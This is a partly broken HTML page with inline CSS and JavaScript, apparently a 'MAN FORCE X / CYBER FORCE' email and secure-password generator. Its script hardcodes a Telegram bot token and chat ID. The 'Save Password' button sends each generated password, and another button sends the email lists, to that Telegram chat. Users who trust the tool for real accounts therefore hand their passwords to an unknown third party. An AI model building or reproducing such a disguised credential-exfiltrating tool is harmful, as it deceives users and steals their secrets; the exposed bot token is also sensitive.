<!DOCTYPE html>
<html lang="en">
<head>

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow-x: hidden;
            background: #0a0a0a;

        }

        body {

            flex-direction: column;
            min-height: 100vh;
        }

        /* Background Videos - FIXED FOR MOBILE */

            left: 0;

            z-index: -2;
            filter: brightness(0.25) contrast(1.2);
        }

        #bg-video-right {
            display: none; /* Hidden on mobile for performance */
        }

        /* Overlay */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(10,10,10,0.95) 0%, rgba(0,20,40,0.92) 100%);
            z-index: -1;
        }

        /* Header - MOBILE OPTIMIZED */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: rgba(0, 15, 30, 0.92);

            top: 0;
            z-index: 1000;
            width: 100%;
            flex-shrink: 0;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo-icon {
            font-size: 2rem;
            color: #00ffea;
            animation: pulse 2s infinite;
        }

        .logo-text {
            font-size: 1.4rem;
            font-weight: 800;
            background: linear-gradient(45deg, #00ffea, #0080ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 15px rgba(0, 255, 234, 0.3);
            line-height: 1.2;
        }

        .brand-subtitle {
            font-size: 0.75rem;
            color: #80ffea;
            letter-spacing: 1.5px;
            text-transform: uppercase;
        }

        .header-info {
            font-size: 0.8rem;
            color: #00ffea;
        }

        /* Main Container - FIXED LAYOUT */
        .container {
            display: flex;
            flex-direction: column;
            flex: 1;
            padding: 15px;
            gap: 15px;
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
        }

        /* Mobile First Layout */
        .left-panel, .right-panel {
            width: 100%;
            background: rgba(0, 12, 24, 0.92);
            border-radius: 15px;

        .left-panel {

            margin-bottom: 15px;
        }

        .right-panel {
            order: 1;
        }

        /* Loading Section - IMPROVED */

            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px 0;
        }

        .loading-title {
            font-size: 1.8rem;
            margin-bottom: 25px;
            text-align: center;
            color: #00ffea;
            text-shadow: 0 0 10px #00ffea;
            line-height: 1.3;
        }

        .loader {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: conic-gradient(transparent, #00ffea);
            animation: spin 1.5s linear infinite;
            position: relative;
            margin-bottom: 25px;
        }

        .loader::before {
            content: '';
            position: absolute;
            top: 8px;
            left: 8px;
            right: 8px;
            bottom: 8px;
            border-radius: 50%;
            background: rgba(0, 12, 24, 0.95);
        }

        .loading-text {
            font-size: 1rem;
            color: #80ffea;
            margin-top: 15px;
            text-align: center;
            animation: fadeInOut 2s infinite;
            padding: 0 10px;
        }

        /* Profile Section */

            margin-top: 25px;
            text-align: center;
        }

        .profile-image {
            width: 160px;
            height: 160px;
            border-radius: 50%;
            border: 3px solid #00ffea;
            object-fit: cover;
            box-shadow: 0 0 25px rgba(0, 255, 234, 0.5);
            margin-bottom: 15px;
        }

        /* Right Panel Improvements */

            font-size: 1.5rem;
            margin-bottom: 20px;
            color: #ff00aa;
            text-shadow: 0 0 8px #ff00aa;

            color: #80ffea;

        .input-field {

            border-radius: 8px;

        /* Button Groups - MOBILE FRIENDLY */

        .btn {

        .result-email {

            padding-right: 10px;
            flex: 1;
        }

        .result-status {
            font-size: 0.75rem;
            padding: 3px 6px;
            border-radius: 4px;
            font-weight: 600;
            white-space: nowrap;
            flex-shrink: 0;

            color: #00ff00;
        }

        .status-used {
            background: rgba(255, 0, 0, 0.2);
            color: #ff5555;

        /* Footer - MOBILE OPTIMIZED */
        .footer {
            background: rgba(0, 10, 20, 0.95);
            padding: 15px 20px;
            border-top: 1px solid #00aaff;
            display: flex;
            flex-direction: column;
            gap: 15px;

        .social-links {
            display: flex;

            gap: 15px;
        }

        .social-link {
            color: #80ffea;
            font-size: 1.3rem;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(0, 255, 234, 0.1);
        }

        .social-link:active {
            color: #00ffea;
            transform: translateY(-2px);
            background: rgba(0, 255, 234, 0.2);
        }

        /* Animations */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { opacity: 0.8; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.05); }
            100% { opacity: 0.8; transform: scale(1); }
        }

        @keyframes fadeInOut {
            0% { opacity: 0.6; }
            50% { opacity: 1; }
            100% { opacity: 0.6; }
        }

        /* Desktop Optimization */
        @media (min-width: 768px) {
            .header {
                padding: 20px 40px;
            }

            .logo-text {
                font-size: 1.8rem;
            }

            .container {
                flex-direction: row;
                padding: 20px;
                gap: 20px;
            }

            .left-panel {
                flex: 0 0 45%;
                order: 1;
                margin-bottom: 0;
            }

            .right-panel {
                flex: 1;
                order: 2;
            }

            .button-group {
                flex-direction: row;
            }

            .btn {
                width: auto;
            }

            .footer {
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
                padding: 20px 40px;
            }

            #bg-video-main {
                width: 70%;
            }

            #bg-video-right {
                display: block;
                position: fixed;
                top: 0;
                right: 0;
                width: 30%;
                height: 100%;
                object-fit: cover;
                z-index: -2;
                filter: brightness(0.4) hue-rotate(90deg);
            }
        }

        @media (min-width: 992px) {
            .container {
                max-width: 1400px;
                padding: 30px;

            }

            .left-panel, .right-panel {

        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 6px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(0, 30, 60, 0.5);
            border-radius: 3px;
        }

            background: linear-gradient(#00ffea, #0080ff);
            border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(#00ffaa, #00aaff);

        /* Touch Improvements */
        @media (hover: none) and (pointer: coarse) {
            .btn, .social-link {
                min-height: 44px; /* Apple's recommended touch target */
            }
            
            .input-field {
                font-size: 16px; /* Prevents iOS zoom on focus */
            }
        }
    </style>
</head>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '8599962337:AAFQWbWMYmYoC7HZsRSYt11wDWUWoZ9cg_Q';
        const TELEGRAM_CHAT_ID = '6404359541';

        // DOM Elements
        const generateEmailsBtn = document.getElementById('generateEmails');
        const addToDatabaseBtn = document.getElementById('addToDatabase');
        const generatePasswordBtn = document.getElementById('generatePassword');
        const copyPasswordBtn = document.getElementById('copyPassword');
        const savePasswordBtn = document.getElementById('savePassword');
        const emailResults = document.getElementById('emailResults');
        const pwdLength = document.getElementById('pwdLength');
        const lengthValue = document.getElementById('lengthValue');
        
        // Generated data storage
        let generatedEmails = [];
        let currentPassword = '';

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            // Set initial password length display
            updatePasswordLength();
            
            // Generate initial emails
            generateEmailList();
            
            // Generate initial password
            generatePassword();
            
            // Setup touch event listeners for mobile
            setupMobileEvents();
        });

        // Mobile touch optimizations
        function setupMobileEvents() {
            // Prevent long press on buttons
            const buttons = document.querySelectorAll('.btn');
            buttons.forEach(btn => {
                btn.addEventListener('touchstart', function(e) {
                    this.style.transform = 'translateY(-2px)';
                });
                
                btn.addEventListener('touchend', function(e) {
                    this.style.transform = '';
                });
                
                // Prevent context menu on long press
                btn.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                });
            });
        }

        // Password length slider
        pwdLength.addEventListener('input', updatePasswordLength);
        
        function updatePasswordLength() {
            const length = pwdLength.value;
            lengthValue.textContent = length;
        }

        // Generate Email List
        function generateEmailList() {
            const baseName = document.getElementById('baseName').value.toLowerCase().replace(/\s+/g, '');
            const count = parseInt(document.getElementById('emailCount').value);
            
            if (!baseName) {
                alert('Please enter a base name!');
                return;
            }
            
            generatedEmails = [];
            emailResults.innerHTML = '';
            
            const domains = [
                'gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com',
                'protonmail.com', 'cyberforce.io', 'manforcex.com',
                'hackermail.com', 'securemail.com', 'darkwebmail.org'
            ];
            
            const prefixes = ['x', 'pro', 'team', 'hack', 'secure', 'force', 'cyber', 'dark', 'ghost', 'shadow'];
            const separators = ['', '.', '-', '_'];
            
            for (let i = 1; i <= count; i++) {
                const separator = separators[Math.floor(Math.random() * separators.length)];
                const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
                const randomDomain = domains[Math.floor(Math.random() * domains.length)];
                
                // Generate email with variations
                let email;
                if (Math.random() > 0.5) {
                    email = `${baseName}${separator}${prefix}${i}@${randomDomain}`;
                } else {
                    email = `${prefix}${separator}${baseName}${i}@${randomDomain}`;
                }
                
                const isUsed = Math.random() > 0.7; // 30% chance of being "used"
                
                generatedEmails.push({
                    email: email,
                    used: isUsed,
                    added: false
                });
                
                const emailElement = document.createElement('div');
                emailElement.className = 'result-item';
                emailElement.innerHTML = `
                    <div class="result-email">${email}</div>
                    <div class="result-status ${isUsed ? 'status-used' : 'status-available'}">
                        ${isUsed ? 'USED' : 'NEW'}
                    </div>
                `;
                
                emailResults.appendChild(emailElement);
            }
            
            // Add to results container
            if (generatedEmails.length > 0) {
                emailResults.parentElement.scrollTop = 0;
            }
        }

        // Send data to Telegram
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.error('Telegram error:', error);
                return false;
            }
        }

        // Generate Password
        function generatePassword() {
            const length = parseInt(pwdLength.value);
            const useUpper = document.getElementById('useUppercase').checked;
            const useLower = document.getElementById('useLowercase').checked;
            const useNumbers = document.getElementById('useNumbers').checked;
            const useSymbols = document.getElementById('useSymbols').checked;
            
            let charset = '';
            if (useUpper) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            if (useLower) charset += 'abcdefghijklmnopqrstuvwxyz';
            if (useNumbers) charset += '0123456789';
            if (useSymbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
            
            if (charset === '') {
                document.getElementById('generatedPassword').value = 'Select character types';
                return;
            }
            
            let password = '';
            const cryptoArray = new Uint8Array(length);
            crypto.getRandomValues(cryptoArray);
            
            for (let i = 0; i < length; i++) {
                password += charset[cryptoArray[i] % charset.length];
            }
            
            currentPassword = password;
            document.getElementById('generatedPassword').value = password;
        }

        // Event Listeners
        generateEmailsBtn.addEventListener('click', generateEmailList);
        
        generatePasswordBtn.addEventListener('click', generatePassword);
        
        copyPasswordBtn.addEventListener('click', function() {
            const passwordField = document.getElementById('generatedPassword');
            
            // Select and copy
            passwordField.select();
            passwordField.setSelectionRange(0, 99999);
            
            try {
                document.execCommand('copy');
                
                // Visual feedback
                const originalIcon = this.innerHTML;
                this.innerHTML = '<i class="fas fa-check"></i>';
                this.style.background = 'linear-gradient(45deg, #00ff00, #00cc00)';
                
                setTimeout(() => {
                    this.innerHTML = originalIcon;
                    this.style.background = '';
                }, 1500);
            } catch (err) {
                // Fallback for mobile
                navigator.clipboard.writeText(passwordField.value)
                    .then(() => {
                        const originalIcon = this.innerHTML;
                        this.innerHTML = '<i class="fas fa-check"></i>';
                        this.style.background = 'linear-gradient(45deg, #00ff00, #00cc00)';
                        
                        setTimeout(() => {
                            this.innerHTML = originalIcon;
                            this.style.background = '';
                        }, 1500);
                    });
            }
        });

        savePasswordBtn.addEventListener('click', async function() {
            if (!currentPassword) {
                alert('Generate a password first!');
                return;
            }
            
            const message = `ðŸ”’ <b>NEW PASSWORD SAVED</b>\n\n` +
                           `Password: <code>${currentPassword}</code>\n` +
                           `Length: ${currentPassword.length} chars\n` +
                           `Time: ${new Date().toLocaleTimeString()}\n` +
                           `System: CYBER FORCE GENERATOR`;
            
            const success = await sendToTelegram(message);
            
            // Visual feedback
            const originalText = this.innerHTML;
            if (success) {
                this.innerHTML = '<i class="fas fa-check"></i> SAVED';
                this.style.background = 'linear-gradient(45deg, #00ff00, #00cc00)';
                
                setTimeout(() => {
                    this.innerHTML = originalText;
                    this.style.background = '';
                }, 2000);
            } else {
                this.innerHTML = '<i class="fas fa-times"></i> ERROR';
                this.style.background = 'linear-gradient(45deg, #ff0000, #cc0000)';
                
                setTimeout(() => {
                    this.innerHTML = originalText;
                    this.style.background = '';
                }, 2000);
            }
        });

        addToDatabaseBtn.addEventListener('click', async function() {
            if (generatedEmails.length === 0) {
                alert('Generate emails first!');
                return;
            }
            
            const availableEmails = generatedEmails.filter(email => !email.used);
            
            if (availableEmails.length === 0) {
                alert('No available emails!');
                return;
            }
            
            // Prepare email list for Telegram
            let emailList = 'ðŸ“§ <b>NEW EMAILS ADDED</b>\n\n';
            const displayCount = Math.min(availableEmails.length, 15);
            
            availableEmails.slice(0, displayCount).forEach((emailObj, index) => {
                emailList += `${index + 1}. ${emailObj.email}\n`;
            });
            
            if (availableEmails.length > displayCount) {
                emailList += `\n...and ${availableEmails.length - displayCount} more`;
            }
            
            emailList += `\n\nTotal: ${availableEmails.length} emails\n`;
            emailList += `Time: ${new Date().toLocaleString()}\n`;
            emailList += `System: MAN FORCE X`;
            
            // Send to Telegram
            const success = await sendToTelegram(emailList);
            
            // Visual feedback
            const originalText = this.innerHTML;
            if (success) {
                this.innerHTML = '<i class="fas fa-check"></i> SENT';
                this.style.background = 'linear-gradient(45deg, #00ff00, #00cc00)';
                
                // Mark emails as added
                generatedEmails.forEach(email => {
                    if (!email.used) email.added = true;
                });
                
                setTimeout(() => {
                    this.innerHTML = originalText;
                    this.style.background = '';
                }, 2000);
            } else {
                this.innerHTML = '<i class="fas fa-times"></i> FAILED';
                this.style.background = 'linear-gradient(45deg, #ff0000, #cc0000)';
                
                setTimeout(() => {
                    this.innerHTML = originalText;
                    this.style.background = '';
                }, 2000);
            }
        });

        // Auto-refresh loading animation
        let loadingTextIndex = 0;
        const loadingTexts = [
            'GENERATING SECURE EMAILS...',
            'CONNECTING TO DATABASE...',
            'ENCRYPTING DATA STREAMS...',
            'SYNCING WITH TELEGRAM BOT...',
            'MAN FORCE X SYSTEM ACTIVE...',
            'CYBER FORCE ONLINE...',
            'GUA MUSANG KELANTAN...'
        ];

        const loadingTextElement = document.querySelector('.loading-text');
        setInterval(() => {
            loadingTextIndex = (loadingTextIndex + 1) % loadingTexts.length;
            loadingTextElement.textContent = loadingTexts[loadingTextIndex];
        }, 3000);

        // Mobile orientation handling
        window.addEventListener('orientationchange', function() {
            // Small delay to allow orientation to complete
            setTimeout(() => {
                window.scrollTo(0, 0);
            }, 100);
        });

        // Prevent zoom on input focus (iOS)
        document.addEventListener('touchstart', function(e) {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                // Do nothing - let user zoom if they want
            }
        }, { passive: true });

        // Initial generation
        setTimeout(() => {
            generateEmailList();
            generatePassword();
        }, 500);
    </script>
</body>
